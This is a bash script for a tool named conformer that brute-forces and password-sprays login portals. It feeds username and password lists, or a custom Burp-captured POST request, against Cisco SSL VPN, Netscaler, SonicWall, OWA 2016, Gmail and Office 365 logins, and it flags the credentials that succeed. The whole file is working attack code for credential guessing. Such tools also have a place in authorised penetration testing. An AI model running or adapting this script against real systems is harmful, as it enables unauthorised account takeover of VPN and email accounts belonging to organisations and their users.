#!/bin/bash

mydir=$(dirname "$0");
source $mydir/modules/CiscoSSLVPN.sh &> /dev/null;
source $mydir/modules/Netscaler.sh &> /dev/null;
source $mydir/modules/SonicWallVOffice.sh &> /dev/null;
source $mydir/modules/OWA2016.sh &> /dev/null;
source $mydir/modules/Gmail.sh &> /dev/null;
source $mydir/modules/Office365.sh &> /dev/null;


#Help Banner Function...
Help_banner(){
if [[ ! -f $mydir/modules/SonicWallVOffice.sh ]] || [[ ! -f $mydir/modules/CiscoSSLVPN.sh ]] || [[ ! -f $mydir/modules/Netscaler.sh ]] || [[ ! -f $mydir/modules/OWA2016.sh ]] || [[ ! -f $mydir/modules/Gmail.sh ]] || [[ ! -f $mydir/modules/Office365.sh ]]; then
echo "Not All Modules Loaded.";
echo "Exiting...";
exit 1;
else
:
fi

echo "conformer v0.4.2";
echo "bk201@foofus.net";
echo "";
echo "usage: conformer.sh <HOST_IP/Hostname><:PORT>(optional) <Username or Users_File> 
       <Password<\\&par1=val1\\&par2=val2>(optional) or Pass_File> <Portal Type> 
       <DISABLE_CHECK>(optional) <DEBUG>(optional) <LOG>(optional)";
echo "";
echo "Portal Types: SonicWallVOffice
              CiscoSSLVPN
              Netscaler
	      OWA2016
              Gmail (Host: mail.google.com) 
              Office365 (Host: outlook.office.com)"; #XenApp";
echo "";
echo "conformer.sh <CUSTOM> <BURP_POST_File> <List> 
<String in Response indicating Success> <LOG>(optional) <DEBUG>(optional)"
echo "";
echo "In BURP_POST_FILE, add a @LIST@ to the parameter you want to brute against. 
(e.g. username=admin&password=@LIST@&domain=example)";
echo "";
echo "Type @SAME@ : Password=Username"
echo "DISABLE_CHECK : Disable Check if compatible Portal.";
echo "DEBUG : outputs HTTP responses to /tmp/password.conformer.debug";
echo "LOG : outputs stdout to /tmp/password.conformer.log"
echo "";
}

#Function to check proper parameters used.
parameter_check(){
#Where script would Update
if [[ $(echo "$1" | tr '[:upper:]' '[:lower:]') == "update" ]]; then
echo "Update from github/svn/repo goes here...";

elif [[ $(echo "$1" | tr '[:upper:]' '[:lower:]') == "custom" ]]; then
CUSTOMPOST "$1" "$2" "$3" "$4" "$5" "$6";

elif [[ $(echo "$1" | tr '[:upper:]' '[:lower:]') == "help" ]] || [[ $(echo "$1" | tr '[:upper:]' '[:lower:]') == "--help" ]] || [[ $(echo "$1" | tr '[:upper:]' '[:lower:]')  == "-h" ]]; then
Help_banner "$1" "$2" "$3" "$4" "$5" "$6";

#Wgets the host parameter. Checks host is up, has a webserver, using SSL/TLS. (doesn't know specifically if it's Cisco SSLVPN Portal)
elif [ "$1" != "" ]; then
host_check=$(wget --timeout=4 -qO- https://$1 --no-check-certificate);
if [[ "$host_check" != "" ]]; then
:
else
echo "Invalid Host, or check your internet connection.";
echo "Exiting...";
exit 1;
fi


#Checks if parameter 2 username file or username entered
if [ "$2" == "" ]; then

echo "no username/file entered.";
echo "Exiting...";
exit 1;
fi

#Checks if a Password was entered or not.
if [ "$3" == "" ]; then
echo "Invalid Password.";
echo "Exiting...";
exit 1;
fi

MAINPOST "$1" "$2" "$3" "$4" "$5" "$6" "$7";

fi
}

CUSTOMPOST(){
PostTocheck="no";
Hostcheck="no";
Referercheck="no";
cookiecheck="no";
parcheck="no";

if [[ ! -f "$2" ]] || [[ ! -f "$3" ]] ; then
echo "Invalid File, Exiting...";
exit 1;
fi
if [[ "$4" == "" ]] ; then
echo "No success condition given, Exiting...";
exit 1;
fi



while read -r line; do 

if [[ "$line" == *"POST"* ]] && [[ $PostTocheck == "no" ]] ; then
PostTo=$(echo "$line" | cut -d " " -f 2);
PostTocheck="yes";

elif [[ "$line" == *"Host:"* ]] && [[ "$Hostcheck" == "no" ]] ; then
HostTo=$(echo "$line" | cut -d " " -f 2);
Hostcheck="yes";

elif [[ "$line" == *"Referer:"* ]] && [[ $Referercheck == "no" ]] ; then
ReferTo=$(echo "$line" | cut -d " " -f 2);
Referercheck="yes";

elif [[ "$line" == *"Cookie:"* ]] && [[ $cookiecheck == "no" ]] ; then
cookies=$(echo "$line" | cut -d " " -f 2-);
cookiecheck="yes";

elif [[ "$line" == *"@LIST@"* ]] ; then
par=$(echo "$line");
parcheck="yes";
fi

done < "$2"

if [[ "$PostTocheck" == "no" ]] || [[ "$Hostcheck" == "no" ]] || [[ "$Referercheck" == "no" ]] || [[ "$cookiecheck" == "no" ]] || [[ "$parcheck" == "no" ]]; then
echo "Invalid File, Exiting...";
exit 1;
fi

echo "Host: $HostTo";
if [[ $(echo "$5" | tr '[:upper:]' '[:lower:]') == "log" ]] || [[ $(echo "$6" | tr '[:upper:]' '[:lower:]') == "log" ]] ; then
	echo "Host: $HostTo" >> /tmp/custom.conformer.log;
fi
for line in $(cat "$3")
do

Return=$(curl -i -s -k  -X $'POST' \
    -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0' -H $'Content-Type: application/x-www-form-urlencoded' -H $'X-Requested-With: XMLHttpRequest' -H $'Referer: '$ReferTo'' \
   -b $''$cookies'' \
    --data-binary $''$(echo $par | sed 's/@LIST@/'$line'/g')'' \
    $'https://'$HostTo''$PostTo'');

if [[ "$5" == "DEBUG" ]] || [[ "$6" == "DEBUG" ]] ; then
	echo $par | sed 's/@LIST@/'$line'/g';
	echo "";
	echo "$Return" >> /tmp/custom.conformer.debug;
	echo "" >> /tmp/custom.conformer.debug;
	echo "" >> /tmp/custom.conformer.debug;
	echo "----------------------------------------------------" >> /tmp/custom.conformer.debug;
fi

if [[ "$Return" == *"$4"* ]]; then
echo $par | sed 's/@LIST@/'$line'/g' | awk '{ print "   "$1":**Success**"}';
if [[ "$5" == "LOG" ]] || [[ "$6" == "LOG" ]] ; then
	echo $par | sed 's/@LIST@/'$line'/g' | awk '{ print "   "$1":**Success**"}' >> /tmp/custom.conformer.log;
fi
else
echo $par | sed 's/@LIST@/'$line'/g' | awk '{ print "   "$1":Failed"}';
if [[ "$5" == "LOG" ]] || [[ "$6" == "LOG" ]] ; then
	echo $par | sed 's/@LIST@/'$line'/g' | awk '{ print "   "$1":Failed"}' >> /tmp/custom.conformer.log;
fi
fi

done
}


MAINPOST(){

#Checks if any parameters were entered.
if [ "$1" != "" ]; then

if [[ $(echo "$4" | tr '[:upper:]' '[:lower:]') == "ciscosslvpn" ]]; then
	check_ciscoSSLVPN "$1" "$2" "$3" "$4" "$5" "$6" "$7";
elif [[ $(echo "$4" | tr '[:upper:]' '[:lower:]')  == "netscaler" ]]; then
	check_Netscaler "$1" "$2" "$3" "$4" "$5" "$6" "$7";
elif [[ $(echo "$4" | tr '[:upper:]' '[:lower:]') == "owa2016" ]]; then
	check_OWA2016 "$1" "$2" "$3" "$4" "$5" "$6" "$7";
elif [[ $(echo "$4" | tr '[:upper:]' '[:lower:]')  == "sonicwallvoffice" ]]; then
	check_SonicWallVOffice "$1" "$2" "$3" "$4" "$5" "$6" "$7";

elif [[ $(echo "$4" | tr '[:upper:]' '[:lower:]') == "gmail" ]]; then
	:
elif [[ $(echo "$4" | tr '[:upper:]' '[:lower:]') == "office365" ]]; then
	:
else
	echo "Invalid Module.";
	echo "Exiting...";
	exit 1;
fi
fi

echo "";
if [[ $(echo "$4" | tr '[:upper:]' '[:lower:]') == "ciscosslvpn" ]] || [[ $(echo "$4" | tr '[:upper:]' '[:lower:]') == "netscaler" ]] || [[ $(echo "$4" | tr '[:upper:]' '[:lower:]') == "sonicwallvoffice" ]] || [[ $(echo "$4" | tr '[:upper:]' '[:lower:]') == "owa2016" ]] ; then
echo "Host: $1";
if [[ $(echo "$5" | tr '[:upper:]' '[:lower:]') == "log" ]] || [[ $(echo "$6" | tr '[:upper:]' '[:lower:]') == "log" ]] || [[ $(echo "$7" | tr '[:upper:]' '[:lower:]') == "log" ]]; then
	echo "Host: $1" >> /tmp/conformer.log;
fi
elif [[ $(echo "$4" | tr '[:upper:]' '[:lower:]') == "gmail" ]]; then
echo "Host: mail.google.com";
if [[ $(echo "$5" | tr '[:upper:]' '[:lower:]') == "log" ]] || [[ $(echo "$6" | tr '[:upper:]' '[:lower:]') == "log" ]] || [[ $(echo "$7" | tr '[:upper:]' '[:lower:]') == "log" ]]; then
	echo "Host: mail.google.com" >> /tmp/conformer.log;
fi
elif [[ $(echo "$4" | tr '[:upper:]' '[:lower:]') == "office365" ]]; then
echo "Host: outlook.office.com";
if [[ $(echo "$5" | tr '[:upper:]' '[:lower:]') == "log" ]] || [[ $(echo "$6" | tr '[:upper:]' '[:lower:]') == "log" ]] || [[ $(echo "$7" | tr '[:upper:]' '[:lower:]') == "log" ]]; then
	echo "Host: outlook.office.com" >> /tmp/conformer.log;
fi
fi


#Determine if username file or username?
if [ ! -f "$2" ]; then
#Determine if password file or password?
if [ ! -f "$3" ]; then
line=$2;
pass=$3;
if [[ $(echo "$4" | tr '[:upper:]' '[:lower:]')  == "ciscosslvpn" ]]; then
	POST_ciscoSSLVPN "$1" "$2" "$3" "$4" "$5" "$6" "$7";

elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "netscaler" ]]; then
	POST_Netscaler "$1" "$2" "$3" "$4" "$5" "$6" "$7";

elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "owa2016" ]]; then
	POST_OWA2016 "$1" "$2" "$3" "$4" "$5" "$6" "$7";

elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "gmail" ]]; then
	POST_Gmail "$1" "$2" "$3" "$4" "$5" "$6" "$7";

elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "office365" ]]; then
	POST_Office365 "$1" "$2" "$3" "$4" "$5" "$6" "$7";

elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "sonicwallvoffice" ]]; then
	POST_SonicWallVOffice "$1" "$2" "$3" "$4" "$5" "$6" "$7";
fi

else
line=$2;
	for pass in $(cat $3); do
		if [[ $(echo "$4" | tr '[:upper:]' '[:lower:]')  == "ciscosslvpn" ]]; then
			POST_ciscoSSLVPN "$1" "$2" "$3" "$4" "$5" "$6" "$7";
		
		elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "netscaler" ]]; then
			POST_Netscaler "$1" "$2" "$3" "$4" "$5" "$6" "$7";

		elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "owa2016" ]]; then
			POST_OWA2016 "$1" "$2" "$3" "$4" "$5" "$6" "$7";
	
		elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "gmail" ]]; then
			POST_Gmail "$1" "$2" "$3" "$4" "$5" "$6" "$7";

		elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "office365" ]]; then
			POST_Office365 "$1" "$2" "$3" "$4" "$5" "$6" "$7";

		elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "sonicwallvoffice" ]]; then
			POST_SonicWallVOffice "$1" "$2" "$3" "$4" "$5" "$6" "$7";
		fi
	done
fi

#Userlist
else

if [ ! -f "$3" ]; then

	for line in $(cat $2); do
		pass=$3;
		if [ "$pass" == "@SAME@" ]; then
		pass=$line;
		fi
		
		if [[ $(echo "$4" | tr '[:upper:]' '[:lower:]')  == "ciscosslvpn" ]]; then
			POST_ciscoSSLVPN "$1" "$2" "$3" "$4" "$5" "$6" "$7";
		elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "netscaler" ]]; then
			POST_Netscaler "$1" "$2" "$3" "$4" "$5" "$6" "$7";

		elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "owa2016" ]]; then
			POST_OWA2016 "$1" "$2" "$3" "$4" "$5" "$6" "$7";
	
		elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "gmail" ]]; then
			POST_Gmail "$1" "$2" "$3" "$4" "$5" "$6" "$7";

		elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "office365" ]]; then
			POST_Office365 "$1" "$2" "$3" "$4" "$5" "$6" "$7";

		elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "sonicwallvoffice" ]]; then
			POST_SonicWallVOffice "$1" "$2" "$3" "$4" "$5" "$6" "$7";
		fi
	done

#userlist with passwordlist
else
	for line in $(cat $2); do
		for pass in $(cat $3); do
		
		if [[ $(echo "$4" | tr '[:upper:]' '[:lower:]')  == "ciscosslvpn" ]]; then
			POST_ciscoSSLVPN "$1" "$2" "$3" "$4" "$5" "$6" "$7";
		elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "netscaler" ]]; then
			POST_Netscaler "$1" "$2" "$3" "$4" "$5" "$6" "$7";
		elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "owa2016" ]]; then
			POST_OWA2016 "$1" "$2" "$3" "$4" "$5" "$6" "$7";
		elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "gmail" ]]; then
			POST_Gmail "$1" "$2" "$3" "$4" "$5" "$6" "$7";
		elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "office365" ]]; then
			POST_Office365 "$1" "$2" "$3" "$4" "$5" "$6" "$7";
		elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "sonicwallvoffice" ]]; then
			POST_SonicWallVOffice "$1" "$2" "$3" "$4" "$5" "$6" "$7";
		fi
	done
done
fi

fi
}


#checks if parameters present
#program execution begins here.
if [ "$1" == "" ]; then
Help_banner;
fi
parameter_check "$1" "$2" "$3" "$4" "$5" "$6" "$7";
